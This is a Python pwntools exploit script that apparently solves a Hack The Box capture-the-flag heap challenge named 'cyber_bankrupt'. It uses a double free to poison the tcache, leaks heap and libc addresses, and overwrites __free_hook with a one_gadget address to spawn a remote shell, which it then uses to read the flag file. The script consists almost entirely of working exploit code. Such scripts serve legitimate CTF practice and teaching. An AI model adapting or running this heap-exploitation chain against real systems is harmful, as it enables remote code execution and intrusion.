#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
context.log_level = 'critical'

fname = './cyber_bankrupt' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e      = ELF(fname, checksec=False)
libc   = ELF(e.runpath.decode() + 'libc.so.6', checksec=False)
rop    = ROP(e)

rl     = lambda     : r.recvline()
ru     = lambda x   : r.recvuntil(x)
sa     = lambda x,y : r.sendafter(x,y)
sla    = lambda x,y : r.sendlineafter(x,y)

def get_flag():
  pause(1)
  r.sendline('cat flag* 2>/dev/null')
  flag = r.recvline_contains(b"HTB", timeout=0.2).strip().decode()
  if len(flag) == 0:
    print('\n~~ Shell ~~\n')
    r.interactive()
  else:
    print(f'\nFlag --> {flag}')

def transfer(idx, size, data='w3th4nds'):
  sla('> ', '1')
  sla(': ', str(idx))
  sla(': ', str(size))
  sa(': ', data)

def clear(idx): 
  sla('> ', '2')
  sla(': ', str(idx))

def view(idx): 
  sla('> ', '3')
  sla(': ', str(idx))

sla('pin: ', '6969')

print(f'[*] Transferring money..')
transfer(0, 0x100)
print(f'[+] Done!')

print('[*] Clearing history.. x2')
for _ in range(2): clear(0)
print(f'[+] Done!')

view(0)

leak = rl()

curr_chunk = u64(leak[:6].ljust(8, b'\x00'))
print(f'[*] Current chunk: {curr_chunk:#04x}')

print(f'[*] Transferring money..')
transfer(0, 0x100, p64(curr_chunk))
print(f'[+] Done!')
print(f'[*] Transferring money..')
transfer(0, 0x420)
print(f'[+] Done!')
print(f'[*] Transferring money..')
transfer(0, 0x100, p64(curr_chunk))
print(f'[+] Done!')
print(f'[*] Transferring money..')
transfer(0, 0x100)
print(f'[+] Done!')
print('[*] Clearing history..')
clear(0)
print(f'[+] Done!')
print('[*] Trying to leak libc address...')
view(0)
print(f'[+] Done!')

libc.address = u64(rl()[:6].ljust(8, b'\x00')) - 0x3ebca0

print(f'[*] Libc base: {libc.address:#04x}')

transfer(0, 0x40, p64(libc.sym.__free_hook))
transfer(0, 0x100)
transfer(0, 0x100, p64(libc.address + 0x4f322))
clear(0)

get_flag()
